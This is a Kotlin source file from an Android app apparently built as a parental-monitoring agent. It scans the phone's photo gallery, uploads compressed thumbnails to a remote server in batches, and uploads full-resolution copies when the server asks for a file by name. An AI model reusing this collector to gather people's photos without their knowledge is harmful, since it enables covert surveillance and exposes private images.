package com.parental.agent.collectors.media

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.provider.MediaStore
import android.util.Log
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.sync.ApiConstants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream

class PhotoGalleryCollector(private val context: Context) {

    companion object {
        private const val TAG = "PhotoGalleryCollector"
        private const val THUMBNAIL_MAX_DIMENSION = 360
        private const val JPEG_QUALITY = 65
    }

    suspend fun syncGalleryPhotos(): Int = withContext(Dispatchers.IO) {
        var uploadedCount = 0
        try {
            val prefs = AppPreferences(context)
            val deviceId = prefs.getDeviceId()
            val processedIds = getUploadedPhotoIds().toMutableSet()

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE
            )

            var cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            // Fallback for external volume if primary query returns null
            if (cursor == null && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                cursor = context.contentResolver.query(
                    MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL),
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )
            }

            Log.d(TAG, "MediaStore images query returned ${cursor?.count ?: 0} rows.")

            cursor?.use { c ->
                val idColumn = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameColumn = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val sizeColumn = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)

                var count = 0
                while (c.moveToNext() && count < 15) { // Batch top 15 new photos per cycle
                    val rawId = c.getLong(idColumn)
                    val imageId = rawId.toString()
                    if (processedIds.contains(imageId)) continue

                    val originalName = c.getString(nameColumn) ?: "thumb_$imageId.jpg"
                    val originalSizeBytes = c.getLong(sizeColumn)

                    val thumbnailFile = generateUltraLowDataThumbnail(rawId, "thumb_$originalName")
                    if (thumbnailFile != null && thumbnailFile.exists()) {
                        val success = uploadPhotoToServer(thumbnailFile, deviceId, "thumb_$originalName", category = "PHOTO_GALLERY", originalSizeBytes = originalSizeBytes)
                        if (success) {
                            processedIds.add(imageId)
                            uploadedCount++
                            Log.i(TAG, "⚡ ULTRA LOW-DATA THUMBNAIL UPLOADED: thumb_$originalName (${thumbnailFile.length() / 1024} KB, Original HD: ${originalSizeBytes / 1024} KB)")
                        }
                        thumbnailFile.delete()
                    } else {
                        Log.w(TAG, "Failed to generate thumbnail for rawId=$rawId")
                    }
                    count++
                }
            }

            saveUploadedPhotoIds(processedIds)
        } catch (e: Exception) {
            Log.e(TAG, "Error in syncGalleryPhotos: ${e.message}", e)
        }
        return@withContext uploadedCount
    }

    private fun generateUltraLowDataThumbnail(imageId: Long, fileName: String): File? {
        return try {
            val contentUri = android.content.ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)

            // Decode dimensions
            val options = BitmapFactory.Options().apply {
                inJustDecodeBounds = true
            }
            context.contentResolver.openInputStream(contentUri)?.use { input ->
                BitmapFactory.decodeStream(input, null, options)
            }

            val (width, height) = options.outWidth to options.outHeight
            if (width <= 0 || height <= 0) return null

            var sampleSize = 1
            while (width / sampleSize > THUMBNAIL_MAX_DIMENSION || height / sampleSize > THUMBNAIL_MAX_DIMENSION) {
                sampleSize *= 2
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = sampleSize
            }

            val bitmap = context.contentResolver.openInputStream(contentUri)?.use { input ->
                BitmapFactory.decodeStream(input, null, decodeOptions)
            } ?: return null

            val tempFile = File(context.cacheDir, "thumb_$fileName")
            FileOutputStream(tempFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
            }
            bitmap.recycle()

            tempFile
        } catch (e: Exception) {
            Log.w(TAG, "Failed to generate thumbnail for imageId $imageId: ${e.message}")
            null
        }
    }

    suspend fun fetchAndUploadFullSizePhoto(imageId: Long, fileName: String): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            val prefs = AppPreferences(context)
            val deviceId = prefs.getDeviceId()
            val contentUri = android.content.ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)

            val options = BitmapFactory.Options().apply {
                inJustDecodeBounds = true
            }
            context.contentResolver.openInputStream(contentUri)?.use { input ->
                BitmapFactory.decodeStream(input, null, options)
            }

            val (width, height) = options.outWidth to options.outHeight
            if (width <= 0 || height <= 0) return@withContext false

            var sampleSize = 1
            val maxHdDimension = 1920
            while (width / sampleSize > maxHdDimension || height / sampleSize > maxHdDimension) {
                sampleSize *= 2
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = sampleSize
            }

            val bitmap = context.contentResolver.openInputStream(contentUri)?.use { input ->
                BitmapFactory.decodeStream(input, null, decodeOptions)
            } ?: return@withContext false

            val tempFile = File(context.cacheDir, "hd_$fileName")
            FileOutputStream(tempFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
            }
            bitmap.recycle()

            val success = uploadPhotoToServer(tempFile, deviceId, "full_$fileName", category = "PHOTO_FULL")
            tempFile.delete()
            Log.i(TAG, "📸 FULL SIZE HD PHOTO UPLOADED for imageId $imageId: full_$fileName (Success: $success)")
            success
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading full size photo for $imageId: ${e.message}", e)
            false
        }
    }

    suspend fun uploadFullSizePhotoByFilename(requestedFilename: String): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            val cleanName = if (requestedFilename.startsWith("thumb_")) {
                requestedFilename.substring(6)
            } else if (requestedFilename.startsWith("full_")) {
                requestedFilename.substring(5)
            } else {
                requestedFilename
            }

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME
            )

            var cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            if (cursor == null && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                cursor = context.contentResolver.query(
                    MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL),
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )
            }

            var targetId: Long? = null
            var matchedName: String? = null

            cursor?.use { c ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                while (c.moveToNext()) {
                    val name = c.getString(nameCol) ?: ""
                    
                    if (name == cleanName || name.contains(cleanName) || cleanName.contains(name) || name.equals(cleanName, ignoreCase = true)) {
                        targetId = c.getLong(idCol)
                        matchedName = name
                        break
                    }
                }
            }

            if (targetId != null) {
                val success = fetchAndUploadFullSizePhoto(targetId!!, matchedName ?: cleanName)
                Log.i(TAG, "⚡ ON-DEMAND FULL HD PHOTO UPLOAD COMPLETE: $matchedName ($success)")
                notifyFullPhotoStatus(requestedFilename, "SYNCED")
                success
            } else {
                Log.w(TAG, "Full photo request: Image matching $cleanName not found in MediaStore.")
                notifyFullPhotoStatus(requestedFilename, "NOT_FOUND")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadFullSizePhotoByFilename: ${e.message}", e)
            false
        }
    }

    private fun notifyFullPhotoStatus(filename: String, status: String) {
        try {
            val prefs = AppPreferences(context)
            val deviceId = prefs.getDeviceId()
            val client = OkHttpClient()
            val baseUrl = ApiConstants.BASE_URL.trimEnd('/')
            val url = if (baseUrl.endsWith("/api/v1")) "$baseUrl/media/full-photo-status" else "$baseUrl/api/v1/media/full-photo-status"

            val body = FormBody.Builder()
                .add("deviceId", deviceId)
                .add("filename", filename)
                .add("status", status)
                .build()

            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute()
        } catch (e: Exception) {
            // Quiet fail
        }
    }

    fun uploadPhotoToServer(file: File, deviceId: String, fileName: String, category: String = "PHOTO_GALLERY", originalSizeBytes: Long = 0L): Boolean {
        return try {
            val client = OkHttpClient()
            val baseUrl = ApiConstants.BASE_URL.trimEnd('/')
            val uploadUrl = if (baseUrl.endsWith("/api/v1")) {
                "$baseUrl/media/upload"
            } else {
                "$baseUrl/api/v1/media/upload"
            }

            val builder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("deviceId", deviceId)
                .addFormDataPart("category", category)
                .addFormDataPart("fileName", fileName)
                .addFormDataPart(
                    "file",
                    fileName,
                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )

            if (originalSizeBytes > 0L) {
                builder.addFormDataPart("originalSizeBytes", originalSizeBytes.toString())
            }

            val requestBody = builder.build()

            val request = Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "HTTP photo upload failed: Code ${response.code}, Message: ${response.message}")
            }
            response.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "HTTP photo upload exception: ${e.message}", e)
            false
        }
    }

    private fun getUploadedPhotoIds(): Set<String> {
        val prefs = context.getSharedPreferences("photo_gallery_prefs", Context.MODE_PRIVATE)
        return prefs.getStringSet("uploaded_photo_ids", emptySet()) ?: emptySet()
    }

    private fun saveUploadedPhotoIds(ids: Set<String>) {
        val prefs = context.getSharedPreferences("photo_gallery_prefs", Context.MODE_PRIVATE)
        prefs.edit().putStringSet("uploaded_photo_ids", ids).apply()
    }
}
